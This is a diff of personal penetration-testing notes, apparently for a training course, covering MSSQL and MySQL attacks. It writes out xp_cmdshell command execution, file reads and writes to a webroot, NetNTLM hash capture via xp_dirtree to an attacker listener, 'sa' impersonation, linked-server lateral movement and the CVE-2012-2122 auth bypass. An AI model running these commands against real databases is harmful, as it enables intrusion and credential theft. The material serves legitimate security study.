@@ -129,12 +129,17 @@ crackmapexec smb <HOST> -u <u> -p <p> -x 'whoami' --exec-method smbexec   # run 
 - **RPC post-auth** (config permitting): change a user's password, create a domain user / share (rpcclient).
 - **CVE-2020-0796 (SMBGhost)** — SMBv3.1.1 compression flaw, unauth RCE on Win10 1903/1909.
 
-### SQL databases — MSSQL (1433/1434), MySQL (3306)
+### SQL databases — MSSQL (1433/1434, hidden 2433), MySQL (3306)
 ```bash
-nmap -Pn -sV -sC -p1433 <HOST>
+nmap -Pn -sV -sC -p1433 <HOST>                  # ms-sql-info / ms-sql-ntlm-info
 mysql -u <u> -p<pass> -h <HOST>                 # MySQL
-mssqlclient.py <u>@<HOST> -p 1433               # MSSQL (Impacket)  / sqlcmd / sqsh
+mssqlclient.py <u>@<HOST> -p 1433               # MSSQL (Impacket)
+sqlcmd -S <HOST> -U <u> -P '<p>' -y 30 -Y 30     # MSSQL from Windows (-y/-Y = wider output)
+sqsh -S <HOST> -U <u> -P '<p>' -h                # MSSQL from Linux (-h = no headers/footers)
+sqsh -S <HOST> -U .\\<u> -P '<p>' -h              # Windows auth to a LOCAL account (.\\user or SERVER\\user)
 ```
+**Auth modes:** MSSQL = Windows-auth (integrated/AD, default) or Mixed (also SQL logins). Specifying a domain/host → Windows auth; omitting → SQL auth. **CVE-2012-2122** — MySQL 5.6.x auth bypass: repeat the same wrong password for a valid user and a comparison bug eventually logs you in.
+**Default DBs** (enumerate structure): MySQL = `mysql`, `information_schema`, `performance_schema`, `sys`; MSSQL = `master`, `msdb`, `model`, `resource`, `tempdb`.
 Enumerate: `SHOW DATABASES;` (MySQL) / `SELECT name FROM master.dbo.sysdatabases; GO` (MSSQL), then tables via `INFORMATION_SCHEMA.TABLES`.
 **MSSQL attacks:**
 ```sql
@@ -144,14 +149,20 @@ EXECUTE sp_configure 'xp_cmdshell',1; RECONFIGURE; GO
 xp_cmdshell 'whoami'; GO
 -- read local files
 SELECT * FROM OPENROWSET(BULK N'<path>', SINGLE_CLOB) AS c; GO
--- capture the service NetNTLM hash to my SMB listener
-EXEC master..xp_dirtree '\\<MY_IP>\share\'; GO     -- catch with responder / impacket-smbserver
--- impersonation + linked servers
-EXECUTE AS LOGIN='<user>'; ... REVERT; GO
-SELECT srvname,isremote FROM sysservers; GO
-EXECUTE('<query>') AT [<linked_server>]; GO
+-- write a file (MSSQL) via Ole Automation (needs admin):
+EXEC sp_configure 'Ole Automation Procedures',1; RECONFIGURE; GO
+-- then sp_OACreate 'Scripting.FileSystemObject' → sp_OAMethod OpenTextFile/WriteLine → write to wwwroot
+-- capture the service NetNTLM hash to my SMB listener:
+EXEC master..xp_dirtree '\\<MY_IP>\share\'; GO     -- (or xp_subdirs) catch with responder / impacket-smbserver → crack (-m 5600) or relay
+-- impersonation: find who you can impersonate, then become them
+SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id=b.principal_id WHERE a.permission_name='IMPERSONATE'; GO
+SELECT IS_SRVROLEMEMBER('sysadmin'); GO            -- 0 = not sysadmin
+EXECUTE AS LOGIN='sa'; SELECT IS_SRVROLEMEMBER('sysadmin'); -- now 1 ... REVERT; GO  (run in master DB)
+-- linked servers (lateral movement):
+SELECT srvname,isremote FROM sysservers; GO         -- isremote 1=remote, 0=linked
+EXECUTE('select @@version,system_user,is_srvrolemember(''sysadmin'')') AT [<linked_server>]; GO
 ```
-**MySQL:** `LOAD_FILE('<path>')` reads files; `INTO OUTFILE '<webroot>/x.php'` **writes** files — writing a PHP file to the webroot = RCE (I don't store the shell payload; note the technique). FILE privilege + known webroot required.
+**MySQL:** `LOAD_FILE('<path>')` reads files; `INTO OUTFILE '<webroot>/x.php'` **writes** files → PHP to webroot = RCE (technique only, payload not stored). Needs **FILE** privilege + empty `secure_file_priv` (check: `show variables like "secure_file_priv";` — empty = unrestricted, a dir = limited, NULL = disabled) + known webroot.
 
 ### RDP (TCP/3389)
 ```bash
